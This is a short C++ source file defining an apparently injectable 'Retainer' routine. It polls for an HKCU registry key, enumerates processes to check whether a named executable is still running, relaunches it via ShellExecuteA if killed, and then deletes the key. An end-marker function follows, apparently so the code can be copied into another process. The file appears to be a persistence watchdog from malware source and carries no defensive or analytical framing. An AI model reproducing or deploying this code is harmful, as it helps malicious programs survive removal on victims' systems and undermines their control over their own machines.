#include "../core.hpp"

DWORD __stdcall Retainer( INSIDE *api ) {
	HKEY hKey;
	HANDLE procs;

	bool alive = false;

	while(api->RegOpenKeyExA(HKEY_CURRENT_USER, api->key, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
		procs = api->CreateToolhelp32Snapshot(0x00000002, NULL);
		api->pe32.dwSize = sizeof( API::PROCESSENTRY32 );
	 
		api->Process32First(procs, &api->pe32);
		do {
			if (api->lstrcmp(api->pe32.szExeFile, api->exefile) == 0) {
				alive = true;
				break;
			}
		} while (api->Process32Next(procs, &api->pe32));
		if (!alive && (api->RegOpenKeyExA(HKEY_CURRENT_USER, api->key, 0, KEY_READ, &hKey) != ERROR_SUCCESS)) {
			api->ShellExecuteA(NULL, api->open, api->final, NULL, api->directory, NULL);
			break;
		}
		alive = false;
		api->CloseHandle(procs);
		api->Sleep(1);
	}
	api->RegCloseKey(hKey);
	api->RegDeleteKey(HKEY_CURRENT_USER, api->key);
	return 0;
}

void __declspec() ProcEnd_Retainer() {}